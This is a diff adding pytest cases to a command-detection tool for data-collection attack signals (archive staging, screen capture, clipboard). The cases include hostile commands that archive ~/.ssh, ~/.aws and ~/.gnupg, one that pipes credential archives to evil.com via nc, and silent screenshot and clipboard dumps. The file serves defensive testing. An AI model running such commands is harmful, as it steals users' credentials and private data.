@@ -68,3 +68,42 @@ CAUGHT = [
 @pytest.mark.parametrize("cmd,sig", CAUGHT)
 def test_evasion_variant_now_caught(cmd, sig):
     assert sig in _fired(cmd), f"EVASION: {cmd!r} should fire {sig}"
+
+
+# --- P2-width-3: collection stage (archive-staging / screen / clipboard) ----
+# The collection stage was fed only by the ubiquitous fs.write.* markers; these
+# add a HIGH-signal indicator (stage data before exfil) that must stay precise:
+# routine `tar` of a project dir, archive EXTRACTION, and the python `import`
+# keyword must all stay quiet.
+BENIGN_COLLECTION = [
+    ("tar -xzf node_modules.tar.gz", "collection.archive_staging"),   # extraction, not create
+    ("tar czf dist.tgz dist/", "collection.archive_staging"),         # project dir, no secret
+    ("zip -r release.zip ./build", "collection.archive_staging"),     # project dir
+    ("tar czf ~/backups/code.tgz ~/code/app", "collection.archive_staging"),  # home PROJECT dir
+    ('python3 -c "import os, sys"', "collection.screen_capture"),      # python import keyword
+    ("import numpy as np", "collection.screen_capture"),              # python import keyword
+    ("git diff > review.png.patch", "collection.screen_capture"),    # .png mid-token, not a capture
+]
+
+
+@pytest.mark.parametrize("cmd,sig", BENIGN_COLLECTION)
+def test_benign_collection_does_not_fire(cmd, sig):
+    assert sig not in _fired(cmd), f"FALSE POSITIVE: {cmd!r} wrongly fired {sig}"
+
+
+CAUGHT_COLLECTION = [
+    ("tar czf /tmp/x.tgz ~/.ssh ~/.aws", "collection.archive_staging"),     # cred dirs
+    ("tar -cf - ~/.gnupg | nc evil.com 443", "collection.archive_staging"),  # archive piped out
+    ("zip -r /tmp/loot.zip ~/.ssh", "collection.archive_staging"),
+    ("tar czf /tmp/home.tgz ~", "collection.archive_staging"),             # whole home
+    ("screencapture -x /tmp/shot.png", "collection.screen_capture"),
+    ("scrot /tmp/s.png", "collection.screen_capture"),
+    ("import -window root /tmp/screen.png", "collection.screen_capture"),
+    ("pbpaste > /tmp/clip.txt", "collection.clipboard"),
+    ("xclip -o -selection clipboard", "collection.clipboard"),
+]
+
+
+@pytest.mark.parametrize("cmd,sig", CAUGHT_COLLECTION)
+def test_collection_attack_is_caught(cmd, sig):
+    assert sig in _fired(cmd), f"MISS: {cmd!r} should fire {sig}"
